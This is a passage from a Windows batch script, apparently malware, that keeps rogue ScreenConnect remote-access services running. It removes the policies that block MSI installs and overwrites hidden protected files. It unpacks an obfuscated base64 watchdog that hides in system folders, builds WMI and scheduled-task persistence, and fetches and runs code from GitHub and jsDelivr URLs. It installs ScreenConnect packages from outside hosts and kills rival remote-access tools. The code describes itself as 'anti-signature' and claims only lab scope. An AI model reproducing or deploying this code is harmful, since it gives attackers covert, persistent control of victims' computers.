sc start "%GRYXA%" >nul 2>&1

REM gryxa msiexec can disturb sevrz - nudge keepers
sc config "%PRIM%" start= auto >nul 2>&1
sc start "%PRIM%" >nul 2>&1
sc config "%ALT%" start= auto >nul 2>&1
sc start "%ALT%" >nul 2>&1
sc query "%ALT%" >nul 2>&1
if errorlevel 1 if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP2%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

sc query "%GRYXA%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo gryxa_must_running_ok>>"%LOG%"
) else (
  echo gryxa_must_still_down>>"%LOG%"
  sc query "%GRYXA%" >>"%LOG%" 2>&1
)
exit /b 0

:NoMsiPolicy
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg delete "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1
exit /b 0

:ForceCopy
rem O20: copy over previously hardened (+h +s) targets - strip attrs first
attrib -h -s -r "%~2" >nul 2>&1
copy /y "%~1" "%~2" >nul 2>&1
if exist "%~2" exit /b 0
exit /b 1

:Extract
rem %1=tag %2=outfile - pulls base64 block embedded in this script (self-contained mode)
set "TAG=%~1"
set "OUT=%~2"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$raw=Get-Content -LiteralPath '%~f0' -Raw; $m=[regex]::Match($raw,'(?ms)%TAG%_BEGIN\s*(.+?)\s*%TAG%_END'); if($m.Success){ $b=($m.Groups[1].Value -replace '(?m)^::','' -replace '\s',''); try{ [IO.File]::WriteAllBytes('%OUT%',[Convert]::FromBase64String($b)) }catch{} }"
if exist "%OUT%" exit /b 0
exit /b 1

::B64_MON_BEGIN
QGVjaG8gb2ZmDQpyZW0g4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQDQpyZW0gIE9XTl9NT04gIEJVSUxEIDIw
MjYwODAyTTI2DQpyZW0gIFBlcnNpc3RlbnQgd2F0Y2hkb2cgLSBpZGVudGl0eS1hd2FyZSAoYW50
aS1zaWduYXR1cmUpLCBtdXR1YWwNCnJlbSAgV01JK3NjaHRhc2tzIGNoYWlucywgTVNJIGZhbGxi
YWNrLCBNVVNULVJVTiBncnl4YSwgcXVpZXQgZGlnZXN0Lg0KcmVtICBBdXRob3JpemVkIGludGVy
bmFsIGRlcGxveW1lbnQgLSBsYWIvY29tcGV0aXRpb24gc2NvcGUgb25seS4NCnJlbSDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZANCnNldGxvY2FsIEVuYWJsZURlbGF5ZWRFeHBhbnNpb24NCg0Kc2V0ICJLRUVQ
X0ZQPTVmNjAxMDU3OTg1MmU1MDciDQpzZXQgIkFMVF9GUD1mODYxYzgxNDBkNDUzNDI3Ig0Kc2V0
ICJHUllYQV9GUD05OTA4MTk4ZTY2OGU0NzUwIg0Kc2V0ICJXRD1DOlxQcm9ncmFtRGF0YVxNaWNy
b3NvZnRcV2luZG93c1xXRVJcVGVtcFwud3VjYWNoZSINCnNldCAiRVRMPUM6XFByb2dyYW1EYXRh
XE1pY3Jvc29mdFxEaWFnbm9zaXNcU3RhdGVcLmV0bGNhY2hlIg0Kc2V0ICJMT0c9JVdEJVxvd25f
bW9uLmxvZyINCnNldCAiU1RBVEU9JVdEJVxvd25fbW9uLnN0YXRlIg0Kc2V0ICJIQkZMQUc9JVdE
JVxoYi5mbGFnIg0Kc2V0ICJDVVJMPSVTeXN0ZW1Sb290JVxTeXN0ZW0zMlxjdXJsLmV4ZSINCnNl
dCAiVEc9aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3hub2J1ZGR5L2dpdGh1Yi1k
cm9wL21haW4vdGdfcmVwb3J0LnBzMT90PSVSQU5ET00lJVJBTkRPTSUiDQpzZXQgIlRHMj1odHRw
czovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gveG5vYnVkZHkvZ2l0aHViLWRyb3BAbWFpbi90Z19yZXBv
cnQucHMxP3Q9JVJBTkRPTSUlUkFORE9NJSINCnNldCAiT1dOU0VDPWh0dHBzOi8vcmF3LmdpdGh1
YnVzZXJjb250ZW50LmNvbS94bm9idWRkeS9naXRodWItZHJvcC9tYWluL293bl9zZWN1cmUuY21k
P3Q9JVJBTkRPTSUlUkFORE9NJSINCnNldCAiT1dOU0VDMj1odHRwczovL2Nkbi5qc2RlbGl2ci5u
ZXQvZ2gveG5vYnVkZHkvZ2l0aHViLWRyb3BAbWFpbi9vd25fc2VjdXJlLmNtZD90PSVSQU5ET00l
JVJBTkRPTSUiDQpzZXQgIk9XTk1PTj1odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20v
eG5vYnVkZHkvZ2l0aHViLWRyb3AvbWFpbi9vd25fbW9uLmNtZD90PSVSQU5ET00lJVJBTkRPTSUi
DQpzZXQgIk9XTk1PTjI9aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3hub2J1ZGR5L2dpdGh1
Yi1kcm9wQG1haW4vb3duX21vbi5jbWQ/dD0lUkFORE9NJSVSQU5ET00lIg0Kc2V0ICJPV05MSUI9
aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3hub2J1ZGR5L2dpdGh1Yi1kcm9wL21h
aW4vb3duX2xpYi5wczE/dD0lUkFORE9NJSVSQU5ET00lIg0Kc2V0ICJPV05MSUIyPWh0dHBzOi8v
Y2RuLmpzZGVsaXZyLm5ldC9naC94bm9idWRkeS9naXRodWItZHJvcEBtYWluL293bl9saWIucHMx
P3Q9JVJBTkRPTSUlUkFORE9NJSINCnNldCAiTVNJX1VSTD1odHRwczovL3VpLnNldnJ6LmNvbS9C
aW4vU2NyZWVuQ29ubmVjdC5DbGllbnRTZXR1cC5tc2k/ZT1BY2Nlc3MmeT1HdWVzdCINCnNldCAi
TVNJX0dSWVhBPWh0dHBzOi8vdWkuZ3J5eGEuY29tL0Jpbi9TY3JlZW5Db25uZWN0LkNsaWVudFNl
dHVwLm1zaT9lPUFjY2VzcyZ5PUd1ZXN0Ig0Kc2V0ICJNU0lfUEtHMT1odHRwczovL3Jhdy5naXRo
dWJ1c2VyY29udGVudC5jb20veG5vYnVkZHkvZ2l0aHViLWRyb3AvbWFpbi9wa2cubXNpIg0Kc2V0
ICJNU0lfUEtHMj1odHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gveG5vYnVkZHkvZ2l0aHViLWRy
b3BAbWFpbi9wa2cubXNpIg0Kc2V0ICJNU0k9JVByb2dyYW1EYXRhJVxTY3JlZW5Db25uZWN0LkNs
aWVudFNldHVwLm1zaSINCnNldCAiTVNJQ0FDSEU9JVdEJVxwa2cubXNpIg0Kc2V0ICJNU0lfRz0l
UHJvZ3JhbURhdGElXFNjcmVlbkNvbm5lY3QuR3J5eGEubXNpIg0Kc2V0ICJNU0lDQUNIRV9HPSVX
RCVccGtnX2dyeXhhLm1zaSINCg0KaWYgbm90IGV4aXN0ICIlV0QlIiBtZCAiJVdEJSIgMj5udWwN
CmlmIG5vdCBleGlzdCAiJUxPRyUiIHR5cGUgbnVsPiIlTE9HJSIgMj5udWwNCg0Kc2V0ICJNT05W
RVI9TTI2Ig0Kc2V0ICJQRjg2PSVQcm9ncmFtRmlsZXMoeDg2KSUiDQpmb3IgL2YgInRva2Vucz0x
LTMgZGVsaW1zPS8gIiAlJWEgaW4gKCIlZGF0ZSUiKSBkbyBzZXQgIkRUPSVkYXRlJSAldGltZSUi
DQplY2hvLj4+IiVMT0clIg0KZWNobyDilIDilIAgdGljayAhRFQhIFt2ZXIgJU1PTlZFUiVdIOKU
gOKUgD4+IiVMT0clIg0Kc2V0ICJDT1VOVD0wIg0Kc2V0ICJJTlNUQUxMRUQ9MCINCnNldCAiUFJJ
TV9PSz0wIg0Kc2V0ICJBTFRfT0s9MCINCnNldCAiRk9SRUlHTl9MRUZUPTAiDQpzZXQgIkZPUkVJ
R05fTElTVD0iDQpzZXQgIk1TSUVYSVQ9bm90LXJ1biINCg0KcmVtIOKUgOKUgCBbMF0gc2luZ2xl
LWZsaWdodCBtdXRleCAoc3RvcCBvdmVybGFwcGluZyB0aWNrcyByYWNpbmcgbXNpZXhlYykg4pSA
4pSADQpzZXQgIk1VVEVYPSVXRCVcdGljay5sb2NrIg0KaWYgZXhpc3QgIiVNVVRFWCUiICgNCiAg
Zm9yICUlQSBpbiAoIiVNVVRFWCUiKSBkbyBzZXQgIkxPQ0tBR0U9JSV+dEEiDQogIHBvd2Vyc2hl
bGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUNvbW1hbmQgImlmKChUZXN0LVBhdGggJyVN
VVRFWCUnKSAtYW5kICgoKEdldC1EYXRlKS0oR2V0LUl0ZW0gLUxpdGVyYWxQYXRoICclTVVURVgl
JyAtRm9yY2UpLkxhc3RXcml0ZVRpbWUpLlRvdGFsTWludXRlcyAtbHQgOCkpeyBleGl0IDEgfSBl
bHNlIHsgZXhpdCAwIH0iID5udWwgMj4mMQ0KICBpZiBlcnJvcmxldmVsIDEgKA0KICAgIGVjaG8g
dGlja19za2lwcGVkX211dGV4X2J1c3k+PiIlTE9HJSINCiAgICBlbmRsb2NhbA0KICAgIGV4aXQg
L2IgMA0KICApDQopDQplY2hvICVEQVRFJSAlVElNRSUgJVJBTkRPTSU+IiVNVVRFWCUiDQoNCnJl
bSDilIDilIAgcGVyLWhvc3QgaWRlbnRpdHkgKGFudGktc2lnbmF0dXJlKSDilIDilIDilIDilIDi
lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
lIANCmlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5v
bkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIu
cHMxIiAtQWN0aW9uIGluaXQgLVdvcmtEaXIgIiVXRCUiID5udWwgMj4mMQ0KaWYgZXhpc3QgIiVX
RCVcaWRlbnRpdHkuY2ZnIiBmb3IgL2YgInVzZWJhY2txIHRva2Vucz0xLCogZGVsaW1zPT0iICUl
SyBpbiAoIiVXRCVcaWRlbnRpdHkuY2ZnIikgZG8gc2V0ICIlJUs9JSVMIg0KaWYgbm90IGRlZmlu
ZWQgVEFTS19BIHNldCAiVEFTS19BPVdlclF1ZXVlU3luYyINCmlmIG5vdCBkZWZpbmVkIFRBU0tf
QiBzZXQgIlRBU0tfQj1QbGFTZXJ2ZXJIZWFsdGgiDQppZiBub3QgZGVmaW5lZCBUQVNLX0Mgc2V0
ICJUQVNLX0M9V2RpSG9zdFByb3h5Ig0KaWYgbm90IGRlZmluZWQgVEFTS19EIHNldCAiVEFTS19E
PVRjcElwQ29uZmxpY3RSZXMiDQppZiBub3QgZGVmaW5lZCBNT19BIHNldCAiTU9fQT0yIg0KaWYg
bm90IGRlZmluZWQgTU9fQiBzZXQgIk1PX0I9MyINCg0KcmVtIOKUgOKUgCBbQV0gYXV0by11cGRh
dGUgY29yZSBmaWxlcyAoYmVzdCBlZmZvcnQpIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgA0KaWYgbm90IGV4aXN0ICIlQ1VSTCUiIHNldCAiQ1VS
TD1jdXJsLmV4ZSINCiIlQ1VSTCUiIC1MIC0tc3NsLW5vLXJldm9rZSAtLWNvbm5lY3QtdGltZW91
dCA4IC0tbWF4LXRpbWUgNDAgLW8gIiVXRCVcdGdfcmVwb3J0Lm5ldyIgIiVURyUiID5udWwgMj4m
MQ0KaWYgbm90IGV4aXN0ICIlV0QlXHRnX3JlcG9ydC5uZXciICIlQ1VSTCUiIC1MIC0tY29ubmVj
dC10aW1lb3V0IDggLS1tYXgtdGltZSA0MCAtbyAiJVdEJVx0Z19yZXBvcnQubmV3IiAiJVRHMiUi
ID5udWwgMj4mMQ0KYXR0cmliIC1oIC1zIC1yICIlV0QlXHRnX3JlcG9ydC5wczEiID5udWwgMj4m
MQ0KZmluZHN0ciAvQzoiVEdfUkVQT1JUIEJVSUxEIiAiJVdEJVx0Z19yZXBvcnQubmV3IiA+bnVs
IDI+JjEgJiYgZm9yICUlRiBpbiAoIiVXRCVcdGdfcmVwb3J0Lm5ldyIpIGRvIGlmICUlfnpGIEdU
UiAxNTAwIG1vdmUgL3kgIiVXRCVcdGdfcmVwb3J0Lm5ldyIgIiVXRCVcdGdfcmVwb3J0LnBzMSIg
Pm51bCAyPiYxDQpkZWwgL2YgL3EgIiVXRCVcdGdfcmVwb3J0Lm5ldyIgPm51bCAyPiYxDQoiJUNV
UkwlIiAtTCAtLXNzbC1uby1yZXZva2UgLS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDMw
IC1vICIlV0QlXG93bl9zZWN1cmUubmV3IiAiJU9XTlNFQyUiID5udWwgMj4mMQ0KaWYgbm90IGV4
aXN0ICIlV0QlXG93bl9zZWN1cmUubmV3IiAiJUNVUkwlIiAtTCAtLWNvbm5lY3QtdGltZW91dCA4
IC0tbWF4LXRpbWUgMzAgLW8gIiVXRCVcb3duX3NlY3VyZS5uZXciICIlT1dOU0VDMiUiID5udWwg
Mj4mMQ0KYXR0cmliIC1oIC1zIC1yICIlV0QlXG93bl9zZWN1cmUuY21kIiA+bnVsIDI+JjENCmZp
bmRzdHIgL0M6Ik9XTl9TRUNVUkUgQlVJTEQiICIlV0QlXG93bl9zZWN1cmUubmV3IiA+bnVsIDI+
JjEgJiYgZm9yICUlRiBpbiAoIiVXRCVcb3duX3NlY3VyZS5uZXciKSBkbyBpZiAlJX56RiBHVFIg
ODAwIG1vdmUgL3kgIiVXRCVcb3duX3NlY3VyZS5uZXciICIlV0QlXG93bl9zZWN1cmUuY21kIiA+
bnVsIDI+JjENCmRlbCAvZiAvcSAiJVdEJVxvd25fc2VjdXJlLm5ldyIgPm51bCAyPiYxDQoiJUNV
UkwlIiAtTCAtLXNzbC1uby1yZXZva2UgLS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDQw
IC1vICIlV0QlXG93bl9saWIubmV3IiAiJU9XTkxJQiUiID5udWwgMj4mMQ0KaWYgbm90IGV4aXN0
ICIlV0QlXG93bl9saWIubmV3IiAiJUNVUkwlIiAtTCAtLWNvbm5lY3QtdGltZW91dCA4IC0tbWF4
LXRpbWUgNDAgLW8gIiVXRCVcb3duX2xpYi5uZXciICIlT1dOTElCMiUiID5udWwgMj4mMQ0KYXR0
cmliIC1oIC1zIC1yICIlV0QlXG93bl9saWIucHMxIiA+bnVsIDI+JjENCmZpbmRzdHIgL0M6Ik9X
Tl9MSUIgIEJVSUxEIiAiJVdEJVxvd25fbGliLm5ldyIgPm51bCAyPiYxICYmIGZvciAlJUYgaW4g
KCIlV0QlXG93bl9saWIubmV3IikgZG8gaWYgJSV+ekYgR1RSIDE1MDAgbW92ZSAveSAiJVdEJVxv
d25fbGliLm5ldyIgIiVXRCVcb3duX2xpYi5wczEiID5udWwgMj4mMQ0KZGVsIC9mIC9xICIlV0Ql
XG93bl9saWIubmV3IiA+bnVsIDI+JjENCnJlbSBzZWxmLXVwZGF0ZTogZG93bmxvYWQgbmV3IG93
bl9tb24sIGFwcGx5IEFGVEVSIHRoaXMgdGljayAoQlVJTEQtdmVyaWZpZWQpDQpzZXQgIlNFTEZf
VVBEPTAiDQoiJUNVUkwlIiAtTCAtLXNzbC1uby1yZXZva2UgLS1jb25uZWN0LXRpbWVvdXQgOCAt
LW1heC10aW1lIDQwIC1vICIlV0QlXG93bl9tb24ubmV4dCIgIiVPV05NT04lIiA+bnVsIDI+JjEN
CmlmIG5vdCBleGlzdCAiJVdEJVxvd25fbW9uLm5leHQiICIlQ1VSTCUiIC1MIC0tY29ubmVjdC10
aW1lb3V0IDggLS1tYXgtdGltZSA0MCAtbyAiJVdEJVxvd25fbW9uLm5leHQiICIlT1dOTU9OMiUi
ID5udWwgMj4mMQ0KZmluZHN0ciAvQzoiT1dOX01PTiAgQlVJTEQiICIlV0QlXG93bl9tb24ubmV4
dCIgPm51bCAyPiYxDQppZiBub3QgZXJyb3JsZXZlbCAxIGZvciAlJUYgaW4gKCIlV0QlXG93bl9t
b24ubmV4dCIpIGRvIGlmICUlfnpGIEdUUiAxNTAwICgNCiAgZmMgL2IgIiVXRCVcb3duX21vbi5u
ZXh0IiAiJVdEJVxvd25fbW9uLmNtZCIgPm51bCAyPiYxDQogIGlmIGVycm9ybGV2ZWwgMSBzZXQg
IlNFTEZfVVBEPTEiDQopDQppZiAiJVNFTEZfVVBEJSI9PSIwIiBkZWwgL2YgL3EgIiVXRCVcb3du
X21vbi5uZXh0IiA+bnVsIDI+JjENCg0KcmVtIOKUgOKUgCBbQl0gcmUtYXJtIGNoYWluIDE6IG93
bmVyc2hpcC1hd2FyZSAobm90IGV4aXN0ZW5jZS1vbmx5KSDilIDilIANCnJlbSBMMTEvTTIyOiBR
dWVyeS1vbmx5IHNraXBwZWQgcmVhcm0gd2hlbiBXaW5kb3dzIGJ1aWx0LWluIHRhc2tzIHNoYXJl
ZA0KcmVtIGRlZmF1bHQgbmFtZXMgKERpYWdub3Npc1xTY2hlZHVsZWQgZXRjLikgLT4gbW9uIG5l
dmVyIHJhbiwgbm8gbG9nLg0KaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiICgNCiAgZm9yIC9m
ICJ1c2ViYWNrcSBkZWxpbXM9IiAlJVIgaW4gKGBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbklu
dGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMx
IiAtQWN0aW9uIHRhc2tzLWVuc3VyZSAtV29ya0RpciAiJVdEJSIgLU1vblBhdGggIiVXRCVcb3du
X21vbi5jbWQiYCkgZG8gKA0KICAgIGVjaG8gdGFza3NfZW5zdXJlICUlUj4+IiVMT0clIg0KICAg
IHNldCAiVEFTS1NfRU5TVVJFPSUlUiINCiAgKQ0KKQ0KaWYgbm90IGV4aXN0ICIlRVRMJSIgbWtk
aXIgIiVFVEwlIiA+bnVsIDI+JjENCmlmIGV4aXN0ICIlV0QlXG93bl9tb24uY21kIiAoDQogIGF0
dHJpYiAtaCAtcyAtciAiJUVUTCVcZXRsX21vbi5jbWQiID5udWwgMj4mMQ0KICBjb3B5IC95ICIl
V0QlXG93bl9tb24uY21kIiAiJUVUTCVcZXRsX21vbi5jbWQiID5udWwgMj4mMQ0KKQ0KDQpyZW0g
4pSA4pSAIFtCMl0gcmUtYXJtIGNoYWluIDIgKFdNSSBzdWJzY3JpcHRpb24pIGlmIG1pc3Npbmcg
4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSADQppZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIg
KA0KICBmb3IgL2YgInVzZWJhY2txIGRlbGltcz0iICUlUiBpbiAoYHBvd2Vyc2hlbGwgLU5vUHJv
ZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVc
b3duX2xpYi5wczEiIC1BY3Rpb24gd2F0Y2hkb2ctZW5zdXJlIC1Xb3JrRGlyICIlV0QlIiAtTW9u
UGF0aCAiJVdEJVxvd25fbW9uLmNtZCJgKSBkbyBzZXQgIldEX1NUQVRFPSUlUiINCiAgaWYgL0kg
IiFXRF9TVEFURSEiPT0iUkVBUk1FRCIgZWNobyB3YXRjaGRvZyBXTUkgUkVBUk1FRD4+IiVMT0cl
Ig0KKQ0KDQpyZW0g4pSA4pSAIFtFXSBleHRlcm1pbmF0ZSBmb3JlaWduIFNDICsgZGlzYWxsb3dl
ZCBSTU0gKEJFRk9SRSBoZWFsL2luc3RhbGwsDQpyZW0gICAgIHNvIHRoZSBTQyBpbnN0YWxsZXIg
Y3VzdG9tIGFjdGlvbiBuZXZlciBjb2xsaWRlcyB3aXRoIHJpdmFscykg4pSA4pSADQppZiBleGlz
dCAiJVdEJVxvd25fbGliLnBzMSIgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2
ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlv
biBleHRlcm1pbmF0ZSAtV29ya0RpciAiJVdEJSIgPj4iJUxPRyUiIDI+JjENCnRpbWVvdXQgL3Qg
OCAvbm9icmVhayA+bnVsDQpzZXQgIkZPUkVJR05fTEVGVD0wIg0KZm9yIC9mICJ0b2tlbnM9MiBk
ZWxpbXM9KCkiICUlYSBpbiAoJ3NjIHF1ZXJ5IHN0YXRlXj0gYWxsIF58IGZpbmRzdHIgL0M6IlNF
UlZJQ0VfTkFNRTogU2NyZWVuQ29ubmVjdCBDbGllbnQiJykgZG8gKA0KICBzZXQgIkZQPSUlYSIN
CiAgc2V0ICJGUD0hRlA6ID0hIg0KICBpZiAvSSBub3QgIiFGUCEiPT0iJUtFRVBfRlAlIiBpZiAv
SSBub3QgIiFGUCEiPT0iJUFMVF9GUCUiIGlmIC9JIG5vdCAiIUZQISI9PSIlR1JZWEFfRlAlIiAo
DQogICAgc2V0IC9hIENPVU5UKz0xDQogICAgc2V0IC9hIEZPUkVJR05fTEVGVCs9MQ0KICAgIHNl
dCAiRk9SRUlHTl9MSVNUPSFGT1JFSUdOX0xJU1QhIUZQISAiDQogICAgZWNobyBmb3JlaWduX2xl
ZnRfIUZQIT4+IiVMT0clIg0KICApDQopDQoNCnJlbSDilIDilIAgW0NdIGhlYWwgU2NyZWVuQ29u
bmVjdCBwcmltL2FsdCDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIANCmZvciAvZiAidG9rZW5z
PTEsMiBkZWxpbXM9KCkiICUlYSBpbiAoJ3NjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAo
JUtFRVBfRlAlKSIgXnwgZmluZHN0ciAvQzoiU0VSVklDRV9OQU1FIicpIGRvICgNCiAgc2V0ICJJ
TlNUQUxMRUQ9MSINCiAgc2V0ICJQUklNU1RBVEU9JSViIg0KKQ0Kc2MgcXVlcnkgIlNjcmVlbkNv
bm5lY3QgQ2xpZW50ICglS0VFUF9GUCUpIiB8IGZpbmQgIlJVTk5JTkciID5udWwNCmlmIG5vdCBl
cnJvcmxldmVsIDEgKA0KICBzZXQgIlBSSU1fT0s9MSINCiAgc2V0IC9hIENPVU5UKz0xDQopDQpz
YyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgPm51bCAyPiYxDQppZiBu
b3QgZXJyb3JsZXZlbCAxIHNldCAvYSBDT1VOVCs9MQ0Kc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3Qg
Q2xpZW50ICglQUxUX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bA0KaWYgbm90IGVycm9ybGV2
ZWwgMSBzZXQgIkFMVF9PSz0xIg0KDQppZiAiJUlOU1RBTExFRCUiPT0iMSIgaWYgIiVQUklNX09L
JSI9PSIwIiAoDQogIGVjaG8gc3ZjIGhlYWwgcmVzdGFydD4+IiVMT0clIg0KICBuZXQgc3RhcnQg
IlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUF9GUCUpIiA+bnVsIDI+JjENCiAgc2Mgc3RhcnQg
IlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUF9GUCUpIiA+bnVsIDI+JjENCiAgdGltZW91dCAv
dCA2IC9ub2JyZWFrID5udWwNCiAgc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VF
UF9GUCUpIiB8IGZpbmQgIlJVTk5JTkciID5udWwNCiAgaWYgbm90IGVycm9ybGV2ZWwgMSBzZXQg
IlBSSU1fT0s9MSINCikNCnJlbSBNMTY6IHN0aWxsIHN0b3BwZWQgLT4gcmVwYWlyIHRoZSBSRUdJ
U1RFUkVEIHByb2R1Y3QgKG1zaWV4ZWMgL2ZhIHJlc3RvcmVzDQpyZW0gYmluYXJpZXMgKyBzdGFy
dHMgdGhlIHNlcnZpY2U7IEw1IFJlcGFpci1TQ1NlcnZpY2UgaGFuZGxlcyBzdG9wcGVkIHN2Y3Mp
DQppZiAiJUlOU1RBTExFRCUiPT0iMSIgaWYgIiVQUklNX09LJSI9PSIwIiAoDQogIGVjaG8gc3Zj
IGVzY2FsYXRlIHJlcGFpcj4+IiVMT0clIg0KICBpZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIg
cG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5
cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiByZXBhaXIgLUZwICIlS0VFUF9G
UCUiIC1Xb3JrRGlyICIlV0QlIiA+PiIlTE9HJSIgMj4mMQ0KICB0aW1lb3V0IC90IDggL25vYnJl
YWsgPm51bA0KICBzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiIHwg
ZmluZCAiUlVOTklORyIgPm51bA0KICBpZiBub3QgZXJyb3JsZXZlbCAxIHNldCAiUFJJTV9PSz0x
Ig0KKQ0KcmVtIE0xNjogb3JwaGFuZWQgc2VydmljZSBlbnRyeSAocHJvZHVjdCB1bnJlZ2lzdGVy
ZWQgLSBlYXRlbiBieSBhbiBTQy1mYW1pbHkNCnJlbSB1cGdyYWRlIHJlbW92YWwpIGNhbiBORVZF
UiBzdGFydC4gRGVsZXRlIGl0IGFuZCBmYWxsIHRocm91Z2ggdG8gdGhlDQpyZW0gZnJlc2gtaW5z
dGFsbCBsYWRkZXIgYmVsb3cgaW5zdGVhZCBvZiBhbGVydGluZyAid29udCBzdGFydCIgZm9yZXZl
ci4NCmlmICIlSU5TVEFMTEVEJSI9PSIxIiBpZiAiJVBSSU1fT0slIj09IjAiICgNCiAgc2V0ICJS
RUdTVEFURT11bmtub3duIg0KICBpZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgZm9yIC9mICJk
ZWxpbXM9IiAlJVIgaW4gKCdwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1F
eGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHJl
Z2lzdGVyZWQgLUZwICIlS0VFUF9GUCUiIC1Xb3JrRGlyICIlV0QlIicpIGRvIHNldCAiUkVHU1RB
VEU9JSVSIg0KICBlY2hvIG9ycGhhbl9jaGVjaz0hUkVHU1RBVEUhPj4iJUxPRyUiDQogIGlmIC9J
ICIhUkVHU1RBVEUhIj09Im5vIiAoDQogICAgZWNobyBvcnBoYW5fc2VydmljZV9kZWxldGU+PiIl
TE9HJSINCiAgICBzYyBkZWxldGUgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUF9GUCUpIiA+
bnVsIDI+JjENCiAgICBzZXQgIklOU1RBTExFRD0wIg0KICApDQopDQppZiAiJUlOU1RBTExFRCUi
PT0iMSIgaWYgIiVQUklNX09LJSI9PSIwIiAoDQogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9u
SW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5w
czEiIC1BY3Rpb24gc3RhdGUgLVdvcmtEaXIgIiVXRCUiIC1CdWlsZCAlTU9OVkVSJSAtRXh0cmEg
InN2Yy13b250LXN0YXJ0IiA+bnVsIDI+JjENCiAgY2FsbCA6VGdTdGF0ZSBET1dOICJTY3JlZW5D
b25uZWN0ICglS0VFUF9GUCUpIGluc3RhbGxlZCBidXQgd29udCBzdGFydCINCiAgZ290byA6QWZ0
ZXJIZWFsDQopDQppZiAiJUlOU1RBTExFRCUiPT0iMSIgZ290byA6QWZ0ZXJIZWFsDQoNCnJlbSDi
lIDilIAgW0RdIHByaW1hcnkgU0MgbWlzc2luZyAtIGhlYWwgbGFkZGVyIOKUgOKUgOKUgOKUgOKU
